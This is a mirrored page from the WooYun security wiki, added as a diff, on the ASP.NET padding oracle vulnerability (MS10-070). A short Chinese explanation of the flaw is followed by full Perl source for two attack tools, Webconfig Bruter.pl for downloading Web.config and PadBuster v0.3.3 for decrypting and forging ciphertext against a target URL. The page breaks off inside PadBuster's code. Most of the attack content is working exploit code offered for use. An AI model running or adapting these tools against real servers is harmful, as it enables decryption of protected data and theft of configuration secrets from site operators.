@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
+  lang="zh" dir="ltr" class="no-js">
+
+<!-- Mirrored from wiki.wooyun.org/server:padding-oracle-attack?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>server:padding-oracle-attack [WooYun WiKi]</title>
+  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
+<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
+      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
+    <script type="text/javascript">/*<![CDATA[*/
+    var TPL_CONFIG = {"tableFullWidth":1};
+  /*!]]>*/</script>
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="noindex,nofollow"/>
+<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="http://wiki.wooyun.org/"/>
+<link rel="contents" href="http://wiki.wooyun.org/server:padding-oracle-attack?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=server"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/server:padding-oracle-attack"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/server:padding-oracle-attack"/>
+<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:padding-oracle-attack","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
+  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
+  <style type="text/css">
+    body { padding-top: 20px; }
+  </style>
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+<body class="default page-on-panel">
+  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->
+
+  <div id="dokuwiki__site" class="container">
+    <div id="dokuwiki__top" class="site dokuwiki mode_edit tpl_bootstrap3    ">
+
+      
+      <!-- header -->
+      <div id="dokuwiki__header">
+        <nav class="navbar  navbar-default" role="navigation">
+
+  <div class="container-fluid">
+
+    <div class="navbar-header">
+
+      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+
+      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
+    </div>
+
+    <div class="collapse navbar-collapse">
+
+      <ul class="nav navbar-nav" id="dw__navbar">
+        <li class="active">
+  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
+      </ul>
+
+      <div class="navbar-right">
+
+        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
+        <ul class="nav navbar-nav" id="dw__tools">
+  <li class="dropdown">
+    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
+    <ul class="dropdown-menu tools" role="menu">
+
+      <!-- dokuwiki__usertools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
+      
+      <li class="divider"></li>
+
+      <!-- dokuwiki__sitetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
+      <li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=media&amp;ns=server"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
+      <li class="divider"></li>
+
+      <!-- dokuwiki__pagetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
+      <li class="active"><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do="  class="action show" accesskey="v" rel="nofollow" title="显示页面 [V]"><i class="glyphicon glyphicon-edit"></i> 显示页面</a></li><li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
+    </ul>
+  </li>
+</ul>
+
+        <ul class="nav navbar-nav">
+          <li>
+                      </li>
+                    <li><a href="http://wiki.wooyun.org/server:padding-oracle-attack?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>
+
+      </div>
+
+    </div>
+  </div>
+</nav>
+      </div>
+      <!-- /header -->
+
+      
+            <div id="dw__breadcrumbs">
+        <hr/>
+                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:basic"  class="breadcrumbs" title="wooyunwifi:basic">basic</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:console"  class="breadcrumbs" title="wooyunwifi:console">console</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:config"  class="breadcrumbs" title="wooyunwifi:config">config</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/wooyunwifi:bug_recovery"  class="breadcrumbs" title="wooyunwifi:bug_recovery">bug_recovery</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:github"  class="breadcrumbs" title="server:github">github</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:git"  class="breadcrumbs" title="server:git">git</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:svn"  class="breadcrumbs" title="server:svn">svn</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:ds_store"  class="breadcrumbs" title="server:ds_store">ds_store</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:sitebackup"  class="breadcrumbs" title="server:sitebackup">sitebackup</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/server:web.xml"  class="breadcrumbs" title="server:web.xml">web.xml</a></bdi></span></div>
+                <hr/>
+      </div>
+      
+      <p class="pageId text-right">
+        <span class="label label-default">server:padding-oracle-attack</span>
+      </p>
+
+      <div id="dw__msgarea">
+              </div>
+
+      <main class="main row" role="main">
+
+        
+        <!-- ********** CONTENT ********** -->
+        <article id="dokuwiki__content" class="container" >
+
+          <div class="panel panel-default" > 
+            <div class="page group panel-body">
+
+                                          
+              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
+                              </div>
+
+              <!-- wikipage start -->
+              
+<p>
+本页面只读。您可以查看源文件，但不能更改它。如果您觉得这是系统错误，请联系管理员。
+</p>
+    <div class="editBox" role="application">
+
+    <div class="toolbar group">
+        <div id="draft__status"></div>
+        <div id="tool__bar"></div>
+    </div>
+    <form id="dw__editform" method="post" action="#" accept-charset="utf-8"><div class="no">
+<input type="hidden" name="sectok" value="a3845e1693337b10c6abaa01a16b0594" /><input type="hidden" name="id" value="server:padding-oracle-attack" /><input type="hidden" name="rev" value="0" /><input type="hidden" name="date" value="1437672424" /><input type="hidden" name="prefix" value="." /><input type="hidden" name="suffix" value="" /><input type="hidden" name="changecheck" value="bd0066c0d26a65523447c5c2e7d35a37" /><input type="hidden" name="target" value="section" /><textarea name="wikitext" id="wiki__text" dir="auto" class="edit" cols="80" rows="10" tabindex="1" readonly="readonly">
+====== Padding Oracle ======
+
+==== 1、漏洞简介 ====
+
+----
+padding oracle又名MS10-070，是ASP.NET中由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。 虽然攻击者无法利用此漏洞来执行恶意攻击代码或直接提升他们的用户权限，但此漏洞可用于信息搜集，这些信息可用于进一步攻击受影响的系统。
+==== 2、漏洞成因 ====
+
+----
+在对称加密算法中，密文就是密钥加明文经过加密算法处理的结果。加密算法里面的加密是分块实施的，如DES,RC2等算法。每块固定n(8,16,32)位，有余数的情况一般按照某种规则补足，就是所谓的Padding填充，如常用的PKCS#5规则，就是根据最后一个数据块所缺少的长度来选择填充的内容。为了加强加密的效果，所以会把上一块的密文用
+来混淆下一块加密数据，以此类推，用来混淆第一块数据的是预先生成的IV（初始化向量）。
+
+对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的块，通过这种规则我们便可以根据填充的内容来得知填充的长度，以便在解密后去除填充的字节。
+
+一个密文被解密时也是分段进行的，在解密完成之后算法会先检查是否符合规则，如果它的Padding填充方式不符合规则，那么表示输入数据有问题。对于解密的类库来说，往往便会抛出一个PaddingError异常，提示Padding不正确。
+
+在PaddingOracle攻击中，黑客只需要一个合法密文，即可通过不断向网站发送篡改过的密文（这个过程主要是构造IV的过程），观察是否有Padding异常错误提示，网站中的异常错误提示可能直接显示在网页当中，也可能只是HTTP状态码，根据两个不同的HTTP状态码做对比即可，而不需要其他任何详细信息。如果有异常错误提示即可不断地给网站程序提供密文，让解密程序给出错误提示，再而不断地修正，从而最终获得混淆之前的中间密文。拿到中间密文之后，可以通过构造IV，使得中间密文被逆向混淆之后得到的明文为指定内容，从而达到攻击的目的。在这过程中PaddingOracle攻击并没有破解掉加密算法的密钥，也没有能力对任意密文做逆向解密，只是可以利用一个有效密文，生成一个解密后得到任意指定内容明文的伪造密文。
+
+==== 3、漏洞检测及利用 ====
+
+----
+漏洞检测利用工具[[https://github.com/GDSSecurity/PadBuster|padBuster.pl]]与Webconfig Bruter.pl。
+
+Webconfig Bruter.pl
+&lt;code perl&gt;
+# Source: http://blog.mindedsecurity.com/2010/10/breaking-net-encryption-with-or-without.html
+ 
+#!/usr/bin/perl
+#
+#
+#  Webconfig Bruter - exploit tool for downloading Web.config
+#
+#  FOr use this script you need Pudbuster.
+#  Padbuster is a great tool and Brian Holyfield deserve all the credits.
+#  Note from Exploit-db: This very first exploit was meant to work with Padbusterdornet or Padbuster v0.2.
+#  A similar exploitation vector was also added lately in Padbuster v0.3:
+#  http://www.gdssecurity.com/l/b/2010/10/04/padbuster-v0-3-and-the-net-padding-oracle-attack/
+#  http://www.exploit-db.com/sploits/padBuster.pl
+#
+#
+#  Giorgio Fedon - (giorgio.fedon@mindedsecurity.com)
+#   
+use LWP::UserAgent;
+use strict;
+use Getopt::Std;
+use MIME::Base64;
+use URI::Escape;
+use Getopt::Long;
+#Definition of vars for .NET
+my $toEncodeDecode;
+my $b64Encoded;
+my $string;
+my $returnVal;
+my $testUrl;
+my $testBytes;
+my $sampleBytes;
+my $testUrl = @ARGV[0].&quot;\?d\=&quot;;
+my $sampleBytes = @ARGV[1];
+my $blockSize = @ARGV[2];
+if ($#ARGV &lt; 2) {
+ die &quot;   
+  Use: Web.config_bruter.pl ScriptResourceUrl Encrypted_Sample BlockSize
+  Where: URL = The target URL (and query string if applicable)
+         EncryptedSample = The encrypted value you want to use.
+         This need to come from Padbuster.
+         BlockSize = The block size being used by the algorithm (8 or 16)
+         Poc code by giorgio.fedon\@mindedsecurity.com
+  Original Padbuster code from Brian Holyfield - Gotham Digital Science
+ 
+Command Example:
+./Web.config_bruter.pl https://127.0.0.1:8083/ScriptResource.axd  d1ARvno0iSA6Ez7Z0GEAmAy3BpX8a2 16
+          
+&quot;;}
+ 
+my $method = &quot;GET&quot;;
+$sampleBytes = encoder($sampleBytes, 1);
+my $testBytes = &quot;\x00&quot; x $blockSize;
+my $counter = 0;
+# Use random bytes
+my @nums = (0..255);
+my $status = 1;
+  while ($status)
+  {
+   # Fuzz the test bytes
+   for (my $byteNum = $blockSize - 1; $byteNum &gt;= 0; $byteNum--)
+   {
+   substr($testBytes, $byteNum, 1, chr($nums[rand(@nums)]));
+                  }     
+       
+                   # Combine the test bytes and the sample
+   my $combinedTestBytes = encoder($testBytes.$sampleBytes, 0);
+   chomp($combinedTestBytes);
+   $combinedTestBytes =~ s/\%0A//g;
+   # Ok, now make the request
+   my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl.$combinedTestBytes);
+   if ($status == &quot;200&quot;)
+   {
+   # Remove this for &quot;T&quot; exploit
+   if (index($content,&quot;parent\.Sys\.Application&quot;) == -1)
+   {
+   print $content.&quot;\n\n&quot;;
+   print &quot;Total Requests:&quot;.$counter.&quot;\n\n&quot;;
+   print &quot;Resulting Exploit Block:&quot;.$combinedTestBytes.&quot;\n\n&quot;;
+   last;
+   }
+   }
+   $counter++;
+   }
+# The following code is taken from PadBuster. Credit: Brian Holyfield - Gotham Digital Science
+#
+# I also did the encoder / decoder, but your logic is definitely better
+sub encoder
+{
+my ($toEncodeDecode, $oper) = @_;
+ # UrlDecoder Encoder
+ if ($oper == 1)
+   {
+$toEncodeDecode =~ s/\-/\+/g;
+$toEncodeDecode =~ s/\_/\//g;
+my $count = chop($toEncodeDecode);
+$toEncodeDecode = $toEncodeDecode.(&quot;=&quot; x int($count));
+$returnVal = decode_base64($toEncodeDecode);
+   }
+   else
+   {
+$b64Encoded = encode_base64($toEncodeDecode);
+$b64Encoded =~ s/(\r|\n)//g;
+$b64Encoded =~ s/\+/\-/g;
+$b64Encoded =~ s/\//\_/g;
+my $count = $b64Encoded =~ s/\=//g;
+($count eq &quot;&quot;) ? ($count = 0) : &quot;&quot;;
+$returnVal = $b64Encoded.$count;
+   }
+  
+ return $returnVal;
+}
+sub makeRequest {
+ my ($method, $url) = @_;
+ my ($lwp, $status, $content, $req, $location, $contentLength);  
+  
+ # Setup LWP UserAgent
+ $lwp = LWP::UserAgent-&gt;new(env_proxy =&gt; 1,
+                            keep_alive =&gt; 1,
+                            timeout =&gt; 30,
+       requests_redirectable =&gt; [],
+                            );
+  
+ $req = new HTTP::Request $method =&gt; $url;
+ 
+ my $response = $lwp-&gt;request($req);
+  
+ # Extract the required attributes from the response
+ $status = substr($response-&gt;status_line, 0, 3);
+ $content = $response-&gt;content;
+ #print $content;
+ $location = $response-&gt;header(&quot;Location&quot;);
+ if ($location eq &quot;&quot;)
+ {
+  $location = &quot;N/A&quot;;
+ }
+ $contentLength = $response-&gt;header(&quot;Content-Length&quot;);
+ return ($status, $content, $location, $contentLength);
+}
+&lt;/code&gt;
+
+
+padBuster.pl
+&lt;code perl&gt;
+#!/usr/bin/perl
+#
+# PadBuster v0.3.3 - Automated script for performing Padding Oracle attacks
+# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
+#
+# Credits to J.Rizzo and T.Duong for providing proof of concept web exploit
+# techniques and S.Vaudenay for initial discovery of the attack. Credits also
+# to James M. Martin (research@esptl.com) for sharing proof of concept exploit
+# code for performing various brute force attack techniques, and wireghoul (Eldar 
+# Marcussen) for making code quality improvements.  
+# 
+
+use LWP::UserAgent;
+use strict;
+use warnings;
+use Getopt::Std;
+use MIME::Base64;
+use URI::Escape;
+use Getopt::Long;
+use Time::HiRes qw( gettimeofday );
+use Compress::Zlib;
+use Crypt::SSLeay;
+
+# Set defaults with $variable = value
+my $logFiles;
+my $post;
+my $encoding = 0;
+my $headers;
+my $cookie;
+my $error;
+my $prefix;
+my $intermediaryInput;
+my $cipherInput;
+my $plainTextInput;
+my $encodedPlainTextInput;
+my $noEncodeOption;
+my $superVerbose;
+my $proxy;
+my $proxyAuth;
+my $noIv;
+my $auth;
+my $resumeBlock;
+my $interactive = 0;
+my $bruteForce;
+my $ignoreContent;
+my $useBody;
+my $verbose;
+
+GetOptions( &quot;log&quot; =&gt; \$logFiles,
+            &quot;post=s&quot; =&gt; \$post,
+            &quot;encoding=s&quot; =&gt; \$encoding,
+            &quot;headers=s&quot; =&gt; \$headers,
+            &quot;cookies=s&quot; =&gt; \$cookie,
+            &quot;error=s&quot; =&gt; \$error,
+            &quot;prefix=s&quot; =&gt; \$prefix,
+            &quot;intermediate=s&quot; =&gt; \$intermediaryInput,
+            &quot;ciphertext=s&quot; =&gt; \$cipherInput,
+            &quot;plaintext=s&quot; =&gt; \$plainTextInput,
+	    &quot;encodedtext=s&quot; =&gt; \$encodedPlainTextInput,
+            &quot;noencode&quot; =&gt; \$noEncodeOption,
+            &quot;veryverbose&quot; =&gt; \$superVerbose,
+            &quot;proxy=s&quot; =&gt; \$proxy,
+            &quot;proxyauth=s&quot; =&gt; \$proxyAuth,
+            &quot;noiv&quot; =&gt; \$noIv,
+            &quot;auth=s&quot; =&gt; \$auth,
+            &quot;resume=s&quot; =&gt; \$resumeBlock,
+            &quot;interactive&quot; =&gt; \$interactive,
+            &quot;bruteforce&quot; =&gt; \$bruteForce,
+            &quot;ignorecontent&quot; =&gt; \$ignoreContent,
+            &quot;usebody&quot; =&gt; \$useBody,
+            &quot;verbose&quot; =&gt; \$verbose);
+  
+print &quot;\n+-------------------------------------------+\n&quot;;
+print &quot;| PadBuster - v0.3.3                        |\n&quot;;
+print &quot;| Brian Holyfield - Gotham Digital Science  |\n&quot;;
+print &quot;| labs\@gdssecurity.com                      |\n&quot;;
+print &quot;+-------------------------------------------+\n&quot;;
+
+if ($#ARGV &lt; 2) { 
+ die &quot;    
+    Use: padBuster.pl URL EncryptedSample BlockSize [options]
+  Where: URL = The target URL (and query string if applicable)
+         EncryptedSample = The encrypted value you want to test. Must
+                           also be present in the URL, PostData or a Cookie
+         BlockSize = The block size being used by the algorithm
+Options:
+	 -auth [username:password]: HTTP Basic Authentication 
+	 -bruteforce: Perform brute force against the first block 
+	 -ciphertext [Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)
+         -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
+         -encoding [0-4]: Encoding Format of Sample (Default 0)
+                          0=Base64, 1=Lower HEX, 2=Upper HEX
+                          3=.NET UrlToken, 4=WebSafe Base64
+         -encodedtext [Encoded String]: Data to Encrypt (Encoded)
+         -error [Error String]: Padding Error Message
+         -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
+	 -interactive: Prompt for confirmation on decrypted bytes
+	 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
+	 -log: Generate log files (creates folder PadBuster.DDMMYY)
+	 -noencode: Do not URL-encode the payload (encoded by default)
+	 -noiv: Sample does not include IV (decrypt first block) 
+         -plaintext [String]: Plain-Text to Encrypt
+         -post [Post Data]: HTTP Post Data String
+	 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
+	 -proxy [address:port]: Use HTTP/S Proxy
+	 -proxyauth [username:password]: Proxy Authentication
+	 -resume [Block Number]: Resume at this block number
+	 -usebody: Use response body content for response analysis phase
+         -verbose: Be Verbose
+         -veryverbose: Be Very Verbose (Debug Only)
+         
+&quot;;}
+
+# Ok, if we've made it this far we are ready to begin..
+my $url = $ARGV[0];
+my $sample = $ARGV[1];
+my $blockSize = $ARGV[2];
+
+if ($url eq &quot;&quot; || $sample eq &quot;&quot; || $blockSize eq &quot;&quot;) {
+	print &quot;\nERROR: The URL, EncryptedSample and BlockSize cannot be null.\n&quot;;
+	exit();
+}
+
+# Hard Coded Inputs
+#$post = &quot;&quot;;
+#$sample = &quot;&quot;;
+
+my $method = $post ? &quot;POST&quot; : &quot;GET&quot;;
+
+# These are file related variables
+my $dirName = &quot;PadBuster.&quot; . &amp;getTime(&quot;F&quot;);
+my $dirSlash = &quot;/&quot;;
+my $dirCmd = &quot;mkdir &quot;;
+if (defined($ENV{'OS'})) {
+ if ($ENV{OS} =~ /Windows/) {
+  $dirSlash = &quot;\\&quot;;
+  $dirCmd = &quot;md &quot;;
+ }
+}
+my $dirExists = 0;
+my $printStats = 0;
+my $requestTracker = 0;
+my $timeTracker = 0;
+ 
+if ($encoding &lt; 0 || $encoding &gt; 4) {
+	print &quot;\nERROR: Encoding must be a value between 0 and 4\n&quot;;
+	exit();
+} 
+my $encodingFormat = $encoding ? $encoding : 0;
+
+my $encryptedBytes = $sample;
+my $totalRequests = 0;
+
+# See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)
+if ($sample =~ /\%/) {
+	$encryptedBytes = &amp;uri_unescape($encryptedBytes)
+}
+
+# Prep the sample for regex use
+$sample = quotemeta $sample;
+
+# Now decode
+$encryptedBytes = &amp;myDecode($encryptedBytes, $encodingFormat);
+if ( (length($encryptedBytes) % $blockSize) &gt; 0) {
+	print &quot;\nERROR: Encrypted Bytes must be evenly divisible by Block Size ($blockSize)\n&quot;;
+	print &quot;       Encrypted sample length is &quot;.int(length($encryptedBytes)).&quot;. Double check the Encoding and Block Size.\n&quot;;
+	exit();
+}
+
+# If no IV, then append nulls as the IV (only if decrypting)
+if ($noIv &amp;&amp; !$bruteForce &amp;&amp; !$plainTextInput) {
+	$encryptedBytes = &quot;\x00&quot; x $blockSize . $encryptedBytes;
+}
+
+# PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)
+my $plainTextBytes;
+
+# This is a bool to make sure we know where to replace the sample string
+my $wasSampleFound = 0;
+
+# ForgedBytes is where the complete forged sample will be stored (encrypt only)
+my $forgedBytes;
+
+# Isolate the IV into a separate byte array
+my $ivBytes = substr($encryptedBytes, 0, $blockSize);
+
+# Declare some optional elements for storing the results of the first test iteration
+# to help the user if they don't know what the padding error looks like
+my @oracleCantidates;
+my $oracleSignature = &quot;&quot;;
+my %oracleGuesses;
+my %responseFileBuffer;
+
+# The block count should be the sample divided by the blocksize
+my $blockCount = int(length($encryptedBytes)) / int($blockSize);
+
+if (!$bruteForce &amp;&amp; !$plainTextInput &amp;&amp; $blockCount &lt; 2) {
+	print &quot;\nERROR: There is only one block. Try again using the -noiv option.\n&quot;;
+	exit();
+}
+
+# The attack works by sending in a real cipher text block along with a fake block in front of it
+# You only ever need to send two blocks at a time (one real one fake) and just work through
+# the sample one block at a time
+
+
+# First, re-issue the original request to let the user know if something is potentially broken
+my ($status, $content, $location, $contentLength) = &amp;makeRequest($method, $url, $post, $cookie);
+
+&amp;myPrint(&quot;\nINFO: The original request returned the following&quot;,0);
+&amp;myPrint(&quot;[+] Status: $status&quot;,0);	
+&amp;myPrint(&quot;[+] Location: $location&quot;,0);
+&amp;myPrint(&quot;[+] Content Length: $contentLength\n&quot;,0);
+&amp;myPrint(&quot;[+] Response: $content\n&quot;,1);
+
+$plainTextInput = &amp;myDecode($encodedPlainTextInput,$encodingFormat) if $encodedPlainTextInput;
+
+if ($bruteForce) {
+	&amp;myPrint(&quot;INFO: Starting PadBuster Brute Force Mode&quot;,0);
+	my $bfAttempts = 0;
+	
+	print &quot;INFO: Resuming previous brute force at attempt $resumeBlock\n&quot; if $resumeBlock;
+	
+	# Only loop through the first 3 bytes...this should be enough as it 
+	# requires 16.5M+ requests
+	
+	my @bfSamples;
+	my $sampleString = &quot;\x00&quot; x 2;
+	for my $c (0 ... 255) {
+	 substr($sampleString, 0, 1, chr($c));
+	 for my $d (0 ... 255) {
+	  substr($sampleString, 1, 1, chr($d));
+	  push (@bfSamples, $sampleString);
+	 }
+	}
+
+	foreach my $testVal (@bfSamples) {
+	 my $complete = 0;
+	 while ($complete == 0) {
+	  my $repeat = 0;
+	  for my $b (0 ... 255) {
+  	   $bfAttempts++;  	   
+  	   if ( $resumeBlock &amp;&amp; ($bfAttempts &lt; ($resumeBlock - ($resumeBlock % 256)+1)) ) {
+		   #SKIP
+	   } else {
+		   my $testBytes = chr($b).$testVal;
+		   $testBytes .= &quot;\x00&quot; x ($blockSize-3);
+
+		   my $combinedBf = $testBytes;  
+		   $combinedBf .= $encryptedBytes;
+		   $combinedBf = &amp;myEncode($combinedBf, $encoding);
+
+		   # Add the Query String to the URL
+		   my ($testUrl, $testPost, $testCookies) = &amp;prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  
+		   
+
+		   # Issue the request
+		   my ($status, $content, $location, $contentLength) = &amp;makeRequest($method, $testUrl, $testPost, $testCookies);
+
+		   my $signatureData = &quot;$status\t$contentLength\t$location&quot;;
+		   $signatureData = &quot;$status\t$contentLength\t$location\t$content&quot; if $useBody;
+
+		   if ($oracleSignature eq &quot;&quot;) {
+			&amp;myPrint(&quot;[+] Starting response analysis...\n&quot;,0) if ($b ==0);
+			$oracleGuesses{$signatureData}++;
+			$responseFileBuffer{$signatureData} = &quot;Status: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content&quot;;
+			if ($b == 255) {
+				&amp;myPrint(&quot;*** Response Analysis Complete ***\n&quot;,0);
+				&amp;determineSignature();
+				$printStats = 1;
+				$timeTracker = 0;
+				$requestTracker = 0;
+				$repeat = 1;
+				$bfAttempts = 0;
+			}
+		   }
+		   if ($oracleSignature ne &quot;&quot; &amp;&amp; $oracleSignature ne $signatureData) {
+			&amp;myPrint(&quot;\nAttempt $bfAttempts - Status: $status - Content Length: $contentLength\n$testUrl\n&quot;,0);
+			&amp;writeFile(&quot;Brute_Force_Attempt_&quot;.$bfAttempts.&quot;.txt&quot;, &quot;URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content&quot;);
+		   }
+	   }
+	  }
+	  ($repeat == 1) ? ($complete = 0) : ($complete = 1);
+	 } 
+	}  
+} elsif ($plainTextInput) {
+	# ENCRYPT MODE
+	&amp;myPrint(&quot;INFO: Starting PadBuster Encrypt Mode&quot;,0);
+	
+	# The block count will be the plaintext divided by blocksize (rounded up)	
+	my $blockCount = int(((length($plainTextInput)+1)/$blockSize)+0.99);
+	&amp;myPrint(&quot;[+] Number of Blocks: &quot;.$blockCount.&quot;\n&quot;,0);
+	
+	my $padCount = ($blockSize * $blockCount) - length($plainTextInput);	
+	$plainTextInput.= chr($padCount) x $padCount;
+	
+	# SampleBytes is the encrypted text you want to derive intermediate values for, so 
+	# copy the current ciphertext block into sampleBytes
+	# Note, nulls are used if not provided and the intermediate values are brute forced
+	
+	$forgedBytes = $cipherInput ? &amp;myDecode($cipherInput,1) : &quot;\x00&quot; x $blockSize;
+	my $sampleBytes = $forgedBytes;
+	
+	for (my $blockNum = $blockCount; $blockNum &gt; 0; $blockNum--) { 	
+		# IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored
+		my $intermediaryBytes;
+		
+		if ($intermediaryInput &amp;&amp; $blockNum == $blockCount) {
+			$intermediaryBytes = &amp;myDecode($intermediaryInput,2);
+		} else {
+			$intermediaryBytes = &amp;processBlock($sampleBytes);
+		}
+				
+	        # Now XOR the intermediate bytes with the corresponding bytes from the plain-text block
+	        # This will become the next ciphertext block (or IV if the last one)
+	        $sampleBytes = $intermediaryBytes ^ substr($plainTextInput, (($blockNum-1) * $blockSize), $blockSize);
+		$forgedBytes = $sampleBytes.$forgedBytes;
+		
